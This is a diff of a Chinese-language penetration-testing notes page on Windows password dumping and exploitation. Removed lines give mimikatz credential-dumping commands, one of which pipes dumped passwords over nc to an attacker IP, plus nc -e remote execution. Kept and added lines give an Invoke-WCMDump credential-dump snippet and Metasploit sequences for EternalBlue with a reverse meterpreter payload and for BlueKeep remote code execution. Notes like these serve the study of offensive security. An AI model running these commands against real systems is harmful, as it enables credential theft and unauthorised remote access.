@@ -102,66 +102,30 @@
 # 口令获取及破解
 
 **工具**
-- **mimikatz**
-    - 文章
-        - [九种姿势运行 Mimikatz](https://www.freebuf.com/articles/web/176796.html)
-        - [Mimikatz 使用小技巧](https://www.webshell.cc/5343.html)
-
-    提权
-
-    `privilege::debug`
-
-    抓取密码
-
-    `sekurlsa::logonpasswords`
-
-    输出
-    ```shell
-    mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir # 记录 Mimikatz 输出
-    mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt # 输出到 log.txt
-    ```
-
-    输出传输到远程机器
-    ```shell
-    # Attacker 执行
-    nc -lvp 4444
-
-    # Victim 执行
-    mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | nc.exe -vv 192.168.1.1 4444
-    # 192.168.1.1 为Attacker IP
-    ```
-
-    通过 nc 远程执行
-    ```shell
-    # Victim 执行
-    nc -lvp 443
-
-    # Attacker 执行
-    nc.exe -vv 192.168.1.2 443 -e mimikatz.exe
-    # 192.168.1.2 为 Victim IP
-    ```
-
-    若管理员有每过几天就改密码的习惯,但是 mimikatz 抓取到的密码都是老密码,用 QuarksPwDump 等抓的 hash 也是老 hash,新密码却抓不到的情况下
-    ```
-    privilege::debug
-    misc::memssp
-    ```
-    记录的结果在 `c:/windows/system32/mimilsa.log`
-
+- [mimikatz](https://github.com/gentilkiwi/mimikatz) - 抓密码神器
+    - [mimikatz笔记](../../工具/mimikatz笔记.md)
 - [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 用纯 Python 实现的 Mimikatz
-
-- [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) - 抓密码神器
-
+- [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) - 凭证抓取神器
 - [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本
-
-- **[Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump)**
+- [Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump) - 从 Credential Manager 中转储 Windows 凭证的 PowerShell 脚本
     ```
     set-executionpolicy remotesigned
     import-module .\Invoke-WCMDump.ps1
     invoke-wcmdump
     ```
-
 - [SterJo Key Finder](https://www.sterjosoft.com/key-finder.html) - 找出系统中软件的序列号
+- [Hashcat](https://hashcat.net/hashcat/)
+
+**文章**
+- [几种windows本地hash值获取和破解详解](https://www.secpulse.com/archives/65256.html)
+- [Windows密码抓取总结](https://times0ng.github.io/2018/04/20/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/)
+- [深刻理解windows安全认证机制](https://klionsec.github.io/2016/08/10/ntlm-kerberos/)
+- [Windows用户密码的加密方法与破解](https://www.sqlsec.com/2019/11/winhash.html#toc-heading-2)
+- [Windows下的密码hash——NTLM hash和Net-NTLM hash介绍](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/)
+
+**笔记**
+
+关于 windows 认证更多知识点可见笔记 [认证](../../../运维/windows/笔记/认证.md)
 
 ---
 
@@ -245,7 +209,7 @@
     # 使用 payload 连上去
     use exploit/windows/smb/ms17_010_eternalblue
     set payload windows/x64/meterpreter/reverse_tcp
-    set lhost <ip>  # 设一下本机地址
+    set lhost <ip>      # 设置回弹地址
     set rhosts <ip>
     run
 
@@ -279,6 +243,16 @@
     use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
     set rhosts <ip>
     run
+    ```
+    ```bash
+    # 利用
+    use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+    set target <1-7>
+    set rhosts <ip>
+    show options
+    exploit
+    shell
+    python
     ```
 
 ---
